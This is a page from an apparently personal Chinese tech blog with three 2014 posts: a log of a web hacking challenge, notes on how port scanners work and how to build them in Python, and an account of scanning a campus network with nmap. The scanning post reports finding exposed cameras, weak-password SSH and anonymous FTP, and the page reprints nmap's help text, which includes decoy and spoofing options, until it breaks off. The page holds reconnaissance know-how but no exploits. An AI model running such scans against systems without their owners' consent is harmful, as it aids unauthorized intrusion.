<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/6/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/Life/2014/05/04/360-hack-game/" itemprop="url">
                  360 Hack game网络攻防
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-04T00:00:00+08:00" content="2014-05-04">
              2014-05-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/Life/" itemprop="url" rel="index">
                    <span itemprop="name">Life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/Life/2014/05/04/360-hack-game/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="Life/2014/05/04/360-hack-game/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>不知道把这篇文章归入哪一类，那就Life吧。Hack也是life的一部分吧。</p>
<p>最开始是见有人在论坛上问第三道解码的题目。然后lz给出了个地址，就去看了看。后来还挺好玩，就继续做下去了。</p>
<p>没必要在这里披露什么答案，<a href="http://bbs.blackbap.org/thread-5800-1-1.html" target="_blank" rel="external">习科</a>和<a href="http://www.freebuf.com/articles/web/33145.html" target="_blank" rel="external">FreeBuf</a>上已经有详细解答参考答案。就随便记下个人解题过程。</p>
<p>第一关没什么压力。一看就知道显然是更改refer。</p>
<p>第二关，习惯性打开js文件，赫然写着<code>password</code>几个大字。然后就是在浏览器调试工具或者node中跑呗。出题人耍了个小技巧，让结果不返回。反正我当时竟然凭着对js的一点浅薄知识一路复制粘帖用js一层一层解了三次。最后碰到一堆<code>[+&gt;]</code>的东西。我竟然以为是brainfuck，然后把自己电脑跑死机了……后来才忽然感觉是js，复制运行得到结果。</p>
<p>第三关，一不小心在论坛上看到结果了，不过这显然对我不是什么问题。</p>
<p>第四关，发了好久呆。不了解jpg文件格式，用vim打开也没看出什么。后来发现vim打开二进制文件必须加<code>-b</code>参数。再后来在论坛上其他人的提醒下发现竟然是两幅图。光看文件大小真看不出来。</p>
<p>第五关，最简单有没有。虽然不知道都是些什么，全靠百度得来答案。。。是的，百度，谷歌都没用上。</p>
<p>第六关，试了<code>~</code>后缀，最后论坛上有人提醒是vi……真是丧心病狂……</p>
<p>第七关，还是仰仗论坛上提醒要大小写，又这么一碰竟然过了。然后128位的哈希一看就是md5,直接google得到结果。</p>
<p>第八关，代码审计给跪了，php完全不会。考虑暴力穷举感觉尝试量太大，后来见论坛上有人穷举出来了……于是也随手写了个小程序穷举起来。最后论坛上其它人用我的程序穷举出来了我还没穷举出来……</p>
<p>第九关，对着习科上答案来的……可能网络太差吧，等了好久。</p>
<p>第十关，对着参考答案来，可每次文件名都变化。看到32字节长的文件名，就想是不是报头中某个变化的东西比如时间的md5？结果愣是没看出来cookie过期了。还抓了上千个哈希试图破解，却发现只有在cmd5可以找到，还是付费内容。写了个小脚本跑字典，也没解出来文件名到底怎么来的。算了，仰仗论坛上大婶的指点，反正过了。</p>
<p>接下来我想写几样东西：</p>
<ul>
<li>关于扫描器的原理与实现</li>
<li>某次抓取DVS/DVR信息的过程</li>
<li>ftp搜索引擎</li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/05/04//" itemprop="url">
                  扫描器原理与实现
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-04T00:00:00+08:00" content="2014-05-04">
              2014-05-04
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/05/04//#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/05/04//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>随便写写端口扫描器，估计不会写多。最近事情太多。</p>
<h2 id="原理">原理</h2><p>TCP端口扫描的基本原理，就是尝试与被探测端口建立连接，如果这个连接能够建立上，则说明端口是开放的。另一方面，按照TCP三次握手标准其实探测端口是否开放并不用完成三次握手建立连接，仅仅收到第二次握手的包基本就足以说明该端口确实打开并提供服务。</p>
<p>UDP是另一种无连接不可靠数据报交付协议，仅仅发送UDP报文到指定端口，然后等待返回。如果收到回复信息则说明该端口确实提供UDP服务，如果在有限时间内没收到任何回复就当作该端口不存在吧。</p>
<p>在扫描大量机器的大量端口时，比如对TCP端口扫描，如果我们发送一个包后等待建立连接，可能由于网络原因等待很久才会收到回复的报文。这样其它待扫描端口不得不等着，整个扫描器在这段时间内除了等待什么都不做。网络上行带宽没得到充分利用。所以，一般采用多线程或者异步的方式来实现扫描器的并发。</p>
<p>扫描器往往不仅仅就看看端口是否开放，它们往往还搜集信息供人判断，甚至可以提供payload来与目标进行交互。</p>
<h2 id="检阅">检阅</h2><p>最简单的扫描器，比如说netcat：</p>
<pre><code> ~ ⮀ nc -v -z bbs.byr.cn <span class="number">80</span>
Warning: inverse host lookup failed <span class="keyword">for</span> <span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>: 
bbs.byr.cn [<span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>] <span class="number">80</span> (http) open
</code></pre><p>事实上你只要找个能建立连接或者构造包的东西都能作为扫描器，比如hping</p>
<pre><code> ~ ⮀ sudo hping -c <span class="number">1</span> google.com -S -V -p <span class="number">80</span> 
<span class="keyword">using</span> eth0, addr: <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>, MTU: <span class="number">1500</span>
HPING google.com (eth0 <span class="number">74.125</span><span class="number">.128</span><span class="number">.100</span>): S <span class="built_in">set</span>, <span class="number">40</span> headers + <span class="number">0</span> data bytes
len=<span class="number">46</span> ip=<span class="number">74.125</span><span class="number">.128</span><span class="number">.100</span> ttl=<span class="number">29</span> id=<span class="number">13203</span> tos=<span class="number">0</span> iplen=<span class="number">44</span>
sport=<span class="number">80</span> flags=SA seq=<span class="number">0</span> win=<span class="number">42900</span> rtt=<span class="number">185.2</span> ms
seq=<span class="number">2055062331</span> ack=<span class="number">2123742633</span> sum=<span class="number">2338</span> urp=<span class="number">0</span>


--- google.com hping statistic ---
<span class="number">1</span> packets tramitted, <span class="number">1</span> packets received, <span class="number">0</span>% packet loss
</code></pre><p>更专业一点的扫描器有nmap，非常专业的扫描器，在nmap script engine的扩展(lua)下更是可以方便的实现各种功能。功能强大、使用简洁暴力。</p>
<pre><code>✘ ⮀ ~ ⮀ sudo nmap -sS baidu<span class="class">.com</span>

Starting Nmap <span class="number">6.25</span> ( http:<span class="comment">//nmap.org ) at 2014-05-10 10:10 CST</span>
Nmap scan report <span class="keyword">for</span> baidu<span class="class">.com</span> (<span class="number">220.181</span>.<span class="number">111.86</span>)
Host is up (<span class="number">0.0019s</span> latency).
Other addresses <span class="keyword">for</span> baidu<span class="class">.com</span> (not scanned): <span class="number">123.125</span>.<span class="number">114.144</span> <span class="number">220.181</span>.<span class="number">111.85</span>
Not shown: <span class="number">999</span> filtered ports
PORT   STATE SERVICE
<span class="number">80</span>/tcp open  http

Nmap done: <span class="number">1</span> IP <span class="tag">address</span> (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">37.67</span> seconds
</code></pre><p>近两年出现了更加高效的面向整个互联网的扫描器。一个叫zmap，紧接着是masscan。和nmap的多线程实现不同，这两种扫描器靠异步实现高并发。</p>
<h2 id="实践">实践</h2><p>我本来想详细写写最近研究扫描器的一些心得，可是，最近事情太多，没有心情也没有时间。大致用python写扫描器的一些心得吧。</p>
<ol>
<li>你不一定要用别人现成的库。因为你可能根本搞不清有些东西是怎么运作的，而一些细节会让你痛不欲生。事实上如果你只想抓取部分信息，不妨直接自己解析报文对应字段。有时你不得不自己去做什么，比如面对某些用ActiveX的奇葩系统而你还想用python来扫描并搜集信息时。</li>
<li>gevent面对网络I/O真是毫无压力，但同时给内存和CPU带来了更大的负担。据说一个Greenlet占用四个文件描述符，gevent要拷贝大量上下文等等。实际上我这里有时并发根本上不去。超过2000就看着CPU一直处于100%左右而网络流量没有任何变化。不知道是哪里的限制，网络上行无法到达顶峰。但一些简单的例子可以无压力达到。</li>
<li>在进行大范围扫描时不要将某个可能会变的巨大变量塞进内存，虽然把对象放入内存也许会运行的更快，但你的内存满掉时它就不会更快了。这时通过shelve来实现字典相比直接把巨大的dict读入内存并不断扩展更合适。在我的某个例子中，把变量放到硬盘上而不是一股脑塞进内存后性能得到极大改善。</li>
<li><p>大文件的读写时，python有个优雅的方式。一行一行读取。无论是什么巨大的东西，比如说15G的字典文件，这样一行一行读入内存然后让python的垃圾回收机制慢慢回收基本不会占用什么内存。</p>
<pre><code>with <span class="function"><span class="title">open</span><span class="params">(<span class="string">"./data/netbios/temp"</span>)</span></span> as f:
    <span class="keyword">for</span> line <span class="keyword">in</span> f:
        pool.<span class="function"><span class="title">spawn</span><span class="params">(get_netbios, line.strip()</span></span>)
</code></pre></li>
</ol>
<p>还有些其它想法。</p>
<ol>
<li><p>一个是twisted，虽然之前把一个非常棒的教程完整实践下来，寒假拿着手机把文档直接都看完了，甚至Gsoc的时候还想着如果twisted是mentor organization争取报名参加下。结果几个月没接触，完全不知道怎么使用这个框架了。</p>
</li>
<li><p>一个是python对select和epoll的支持，我觉得可能直接使用epoll实现一些并发比gevent会好很多。可是没空去试，我一直觉得epoll和select这种东西用python写出来真是不堪入目。如果是py3，async也许是个好主意。</p>
</li>
<li><p>在使用python做一些比如ip地址处理等等的时候，你也许会发现python3有着内置的模块，更优雅的处理方式。有那么几次真想完全用python3改写已经使用的东西。不过，还是没空。</p>
</li>
</ol>
<p>还有，同学给了我片单片机，我忽然觉得扫描器玩腻了……</p>
<p>不过面对积累的大量扫描数据，我觉得做做数据分析和可视化还是不错的。不会遥遥无期吧，尽管只对python的工具稍微熟悉，更想去用d3.js做展示。</p>
<p>时间和精力有限，语言技能点该怎么点呢？</p>
<p>汇编、C、javascript、python3、lua、也许go、也许再个ruby.</p>
<p>还有两本书等着看或正在看，TCP/IP internetworking和深入理解计算机系统.</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/network/2014/04/18//" itemprop="url">
                  且谈扫描器
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-04-18T00:00:00+08:00" content="2014-04-18">
              2014-04-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/network/" itemprop="url" rel="index">
                    <span itemprop="name">network</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/network/2014/04/18//#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="network/2014/04/18//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="缘起">缘起</h2><p>大概是因为论坛一个毕业去阿里的师兄就这么扫到了一个某品牌摄像头web管理界面。接着，对于我，YD的几周便开始了。各种扫描内网啊，No zuo no die啊= =，然后找到了一大堆开放到内网的摄像头、弱口令ssh、匿名ftp、嵌入式板甚至还有ip电话……独留我风中凌乱。</p>
<p>我准备把常见的东西都研究一圈= =</p>
<p>总之，用到了几种扫描器和自己写的扫描器……</p>
<h2 id="nmap">nmap</h2><p>nmap是一个专业的网络探索和安全审计开源工具。尽管它可以针对主机，却被设计来快速扫描大规模网络。nmap使用IP报文来决定网络上的主机是否可达，主机上哪些服务开放(应用程序名和版本)，它们运行着什么样的操作系统，包过滤器和防火墙的情况和许多其它特征。尽管nmap广泛用于安全审计。许多系统和网络管理员在实行日常工作比如网络发现、管理服务升级安排，监控主机或服务启动时间<br>时都很好用。</p>
<p>nmap的输出是一列被扫描的目标，和有关参数指定的补充信息。常见的比如说端口信息表：</p>
<p> ~ ⮀ sudo nmap 10.210.96.193</p>
<pre><code>Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-04-18 21:44 CST</span>
Nmap scan report <span class="keyword">for</span> <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
Host is up (<span class="number">0.054</span>s latency).
Not <span class="string">shown:</span> <span class="number">996</span> closed ports
PORT      STATE    SERVICE
<span class="number">21</span>/tcp    ssh      closed
<span class="number">23</span>/tcp    open     telnet
<span class="number">50389</span>/tcp filtered unknown
MAC <span class="string">Address:</span> <span class="number">3</span><span class="string">C:</span><span class="string">E5:</span><span class="string">A6:</span><span class="string">D2:</span><span class="number">39</span>:AD (Hangzhou H3C Technologies Co.)
</code></pre><ul>
<li><code>open</code>意味着服务在启动并监听着。比如TCP的三次握手成功建立。</li>
<li><code>closed</code>表示该端口上服务关闭。比如收到了目标主机返回的RST.</li>
<li><code>filtered</code>意味着有防火墙，过滤器等其它障碍阻塞了端口，以致于nmap不知道端口是<code>open</code>还是<code>closed</code>。出现这种情况是发出去的探测包没了响应。</li>
</ul>
<p>如果nmap不能确定到底是哪个状态，这些状态可以写成折中形式<code>closed|filtered</code>,表示关闭或者是过滤。</p>
<p>当使用版本探测参数(<code>-sV</code>)时，端口信息表也可以包含具体的服务版本信息。</p>
<pre><code> ~ ⮀ sudo nmap -sV <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>

Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-04-18 22:03 CST</span>
Nmap scan report <span class="keyword">for</span> <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
Host is up (<span class="number">0.045</span>s latency).
Not <span class="string">shown:</span> <span class="number">996</span> closed ports
PORT      STATE    SERVICE VERSION
<span class="number">23</span>/tcp    open     telnet  H3C <span class="keyword">switch</span> telnetd
MAC <span class="string">Address:</span> <span class="number">3</span><span class="string">C:</span><span class="string">E5:</span><span class="string">A6:</span><span class="string">D2:</span><span class="number">39</span>:AD (Hangzhou H3C Technologies Co.)
Service <span class="string">Info:</span> <span class="string">Device:</span> <span class="keyword">switch</span>

Service detection performed. Please report any incorrect results at <span class="string">http:</span><span class="comment">//nmap.org/submit/ .</span>
Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2.88</span> seconds
</code></pre><p>当使用IP协议扫描(<code>-sO</code>)时，nmap则提供IP支持的协议而不是端口：</p>
<pre><code> ~ ⮀ sudo nmap -sO <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>

Starting Nmap <span class="number">6.25</span> ( <span class="string">http:</span><span class="comment">//nmap.org ) at 2014-04-18 22:02 CST</span>
Nmap scan report <span class="keyword">for</span> <span class="number">10.210</span><span class="number">.96</span><span class="number">.193</span>
Host is up (<span class="number">0.010</span>s latency).
Not <span class="string">shown:</span> <span class="number">252</span> open|filtered protocols
PROTOCOL STATE  SERVICE
<span class="number">1</span>        open   icmp
<span class="number">6</span>        open   tcp
<span class="number">17</span>       open   udp
<span class="number">132</span>      closed sctp
MAC <span class="string">Address:</span> <span class="number">3</span><span class="string">C:</span><span class="string">E5:</span><span class="string">A6:</span><span class="string">D2:</span><span class="number">39</span>:AD (Hangzhou H3C Technologies Co.)
</code></pre><p>除了端口信息表，nmap提供目标的更多信息，包括反向DNS域名，操作系统猜测，设备类型和MAC地址。</p>
<p>更多参照<a href="http://nmap.org/book/" target="_blank" rel="external">Nmap Guide</a></p>
<pre><code><span class="bullet"> ~ </span>⮀ nmap --help
Nmap 6.25 ( http://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -<span class="ruby">iL &lt;inputfilename&gt;<span class="symbol">:</span> <span class="constant">Input</span> from list of hosts/networks
</span>  -<span class="ruby">iR &lt;num hosts&gt;<span class="symbol">:</span> <span class="constant">Choose</span> random targets
</span>  -<span class="ruby">-exclude &lt;host1[,host2][,host3],...&gt;<span class="symbol">:</span> <span class="constant">Exclude</span> hosts/networks
</span>  -<span class="ruby">-excludefile &lt;exclude_file&gt;<span class="symbol">:</span> <span class="constant">Exclude</span> list from file
</span>HOST DISCOVERY:
  -<span class="ruby"><span class="symbol">sL:</span> <span class="constant">List</span> <span class="constant">Scan</span> - simply list targets to scan
</span>  -<span class="ruby"><span class="symbol">sn:</span> <span class="constant">Ping</span> <span class="constant">Scan</span> - disable port scan
</span>  -<span class="ruby"><span class="constant">Pn</span><span class="symbol">:</span> <span class="constant">Treat</span> all hosts as online -- skip host discovery
</span>  -<span class="ruby"><span class="constant">PS</span>/<span class="constant">PA</span>/<span class="constant">PU</span>/<span class="constant">PY</span>[portlist]<span class="symbol">:</span> <span class="constant">TCP</span> <span class="constant">SYN</span>/<span class="constant">ACK</span>, <span class="constant">UDP</span> <span class="keyword">or</span> <span class="constant">SCTP</span> discovery to given ports
</span>  -<span class="ruby"><span class="constant">PE</span>/<span class="constant">PP</span>/<span class="constant">PM</span><span class="symbol">:</span> <span class="constant">ICMP</span> echo, timestamp, <span class="keyword">and</span> netmask request discovery probes
</span>  -<span class="ruby"><span class="constant">PO</span>[protocol list]<span class="symbol">:</span> <span class="constant">IP</span> <span class="constant">Protocol</span> <span class="constant">Ping</span>
</span>  -<span class="ruby">n/-<span class="constant">R</span><span class="symbol">:</span> <span class="constant">Never</span> <span class="keyword">do</span> <span class="constant">DNS</span> resolution/<span class="constant">Always</span> resolve [<span class="symbol">default:</span> sometimes]
</span>  -<span class="ruby">-dns-servers &lt;serv1[,serv2],...&gt;<span class="symbol">:</span> <span class="constant">Specify</span> custom <span class="constant">DNS</span> servers
</span>  -<span class="ruby">-system-<span class="symbol">dns:</span> <span class="constant">Use</span> <span class="constant">OS</span><span class="string">'s DNS resolver
</span></span>  -<span class="ruby"><span class="string">-traceroute: Trace hop path to each host
</span></span>SCAN TECHNIQUES:
  -<span class="ruby"><span class="string">sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
</span></span>  -<span class="ruby"><span class="string">sU: UDP Scan
</span></span>  -<span class="ruby"><span class="string">sN/sF/sX: TCP Null, FIN, and Xmas scans
</span></span>  -<span class="ruby"><span class="string">-scanflags &lt;flags&gt;: Customize TCP scan flags
</span></span>  -<span class="ruby"><span class="string">sI &lt;zombie host[:probeport]&gt;: Idle scan
</span></span>  -<span class="ruby"><span class="string">sY/sZ: SCTP INIT/COOKIE-ECHO scans
</span></span>  -<span class="ruby"><span class="string">sO: IP protocol scan
</span></span>  -<span class="ruby"><span class="string">b &lt;FTP relay host&gt;: FTP bounce scan
</span></span>PORT SPECIFICATION AND SCAN ORDER:
  -<span class="ruby"><span class="string">p &lt;port ranges&gt;: Only scan specified ports
</span></span>    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  -<span class="ruby"><span class="string">F: Fast mode - Scan fewer ports than the default scan
</span></span>  -<span class="ruby"><span class="string">r: Scan ports consecutively - don'</span>t randomize
</span>  -<span class="ruby">-top-ports &lt;number&gt;<span class="symbol">:</span> <span class="constant">Scan</span> &lt;number&gt; most common ports
</span>  -<span class="ruby">-port-ratio &lt;ratio&gt;<span class="symbol">:</span> <span class="constant">Scan</span> ports more common than &lt;ratio&gt;
</span>SERVICE/VERSION DETECTION:
  -<span class="ruby"><span class="symbol">sV:</span> <span class="constant">Probe</span> open ports to determine service/version info
</span>  -<span class="ruby">-version-intensity &lt;level&gt;<span class="symbol">:</span> <span class="constant">Set</span> from <span class="number">0</span> (light) to <span class="number">9</span> (try all probes)
</span>  -<span class="ruby">-version-<span class="symbol">light:</span> <span class="constant">Limit</span> to most likely probes (intensity <span class="number">2</span>)
</span>  -<span class="ruby">-version-<span class="symbol">all:</span> <span class="constant">Try</span> every single probe (intensity <span class="number">9</span>)
</span>  -<span class="ruby">-version-<span class="symbol">trace:</span> <span class="constant">Show</span> detailed version scan activity (<span class="keyword">for</span> debugging)
</span>SCRIPT SCAN:
  -<span class="ruby"><span class="symbol">sC:</span> equivalent to --script=default
</span>  -<span class="ruby">-script=&lt;<span class="constant">Lua</span> scripts&gt;<span class="symbol">:</span> &lt;<span class="constant">Lua</span> scripts&gt; is a comma separated list of 
</span>           directories, script-files or script-categories
  -<span class="ruby">-script-args=&lt;n1=v1,[n2=v2,...]&gt;<span class="symbol">:</span> provide arguments to scripts
</span>  -<span class="ruby">-script-args-file=<span class="symbol">filename:</span> provide <span class="constant">NSE</span> script args <span class="keyword">in</span> a file
</span>  -<span class="ruby">-script-<span class="symbol">trace:</span> <span class="constant">Show</span> all data sent <span class="keyword">and</span> received
</span>  -<span class="ruby">-script-<span class="symbol">updatedb:</span> <span class="constant">Update</span> the script database.
</span>  -<span class="ruby">-script-help=&lt;<span class="constant">Lua</span> scripts&gt;<span class="symbol">:</span> <span class="constant">Show</span> help about scripts.
</span>           &lt;Lua scripts&gt; is a comma separted list of script-files or
           script-categories.
OS DETECTION:
  -<span class="ruby"><span class="constant">O</span><span class="symbol">:</span> <span class="constant">Enable</span> <span class="constant">OS</span> detection
</span>  -<span class="ruby">-osscan-<span class="symbol">limit:</span> <span class="constant">Limit</span> <span class="constant">OS</span> detection to promising targets
</span>  -<span class="ruby">-osscan-<span class="symbol">guess:</span> <span class="constant">Guess</span> <span class="constant">OS</span> more aggressively
</span>TIMING AND PERFORMANCE:
  Options which take &lt;time&gt; are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  -<span class="ruby"><span class="constant">T</span>&lt;<span class="number">0</span>-<span class="number">5</span>&gt;<span class="symbol">:</span> <span class="constant">Set</span> timing template (higher is faster)
</span>  -<span class="ruby">-min-hostgroup/max-hostgroup &lt;size&gt;<span class="symbol">:</span> <span class="constant">Parallel</span> host scan group sizes
</span>  -<span class="ruby">-min-parallelism/max-parallelism &lt;numprobes&gt;<span class="symbol">:</span> <span class="constant">Probe</span> parallelization
</span>  -<span class="ruby">-min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;<span class="symbol">:</span> <span class="constant">Specifies</span>
</span>      probe round trip time.
  -<span class="ruby">-max-retries &lt;tries&gt;<span class="symbol">:</span> <span class="constant">Caps</span> number of port scan probe retransmissions.
</span>  -<span class="ruby">-host-timeout &lt;time&gt;<span class="symbol">:</span> <span class="constant">Give</span> up on target after this long
</span>  -<span class="ruby">-scan-delay/--max-scan-delay &lt;time&gt;<span class="symbol">:</span> <span class="constant">Adjust</span> delay between probes
</span>  -<span class="ruby">-min-rate &lt;number&gt;<span class="symbol">:</span> <span class="constant">Send</span> packets no slower than &lt;number&gt; per second
</span>  -<span class="ruby">-max-rate &lt;number&gt;<span class="symbol">:</span> <span class="constant">Send</span> packets no faster than &lt;number&gt; per second
</span>FIREWALL/IDS EVASION AND SPOOFING:
  -<span class="ruby">f; --mtu &lt;val&gt;<span class="symbol">:</span> fragment packets (optionally w/given <span class="constant">MTU</span>)
</span>  -<span class="ruby"><span class="constant">D</span> &lt;decoy1,decoy2[,<span class="constant">ME</span>],...&gt;<span class="symbol">:</span> <span class="constant">Cloak</span> a scan with decoys
</span>  -<span class="ruby"><span class="constant">S</span> &lt;<span class="constant">IP_Address</span>&gt;<span class="symbol">:</span> <span class="constant">Spoof</span> source address
</span>  -<span class="ruby">e &lt;iface&gt;<span class="symbol">:</span> <span class="constant">Use</span> specified interface
</span>  -<span class="ruby">g/--source-port &lt;portnum&gt;<span class="symbol">:</span> <span class="constant">Use</span> given port number
</span>  -<span class="ruby">-data-length &lt;num&gt;<span class="symbol">:</span> <span class="constant">Append</span> random data to sent packets
</span>  -<span class="ruby">-ip-options &lt;options&gt;<span class="symbol">:</span> <span class="constant">Send</span> packets with specified ip options
</span>  -<span class="ruby">-ttl &lt;val&gt;<span class="symbol">:</span> <span class="constant">Set</span> <span class="constant">IP</span> time-to-live field
</span>  -<span class="ruby">-spoof-mac &lt;mac address/prefix/vendor name&gt;<span class="symbol">:</span> <span class="constant">Spoof</span> your <span class="constant">MAC</span> address
</span>  -<span class="ruby">-<span class="symbol">badsum:</span> <span class="constant">Send</span> packets with a bogus <span class="constant">TCP</span>/<span class="constant">UDP</span>/<span class="constant">SCTP</span> checksum
</span>OUTPUT:
  -<span class="ruby">oN/-oX/-oS/-oG &lt;file&gt;<span class="symbol">:</span> <span class="constant">Output</span> scan <span class="keyword">in</span> normal, <span class="constant">XML</span>, s|&lt;rIpt kIddi3,
</span>     and Grepable format, respectively, to the given filename.
  -<span class="ruby">oA &lt;basename&gt;<span class="symbol">:</span> <span class="constant">Output</span> <span class="keyword">in</span> the three major formats at once
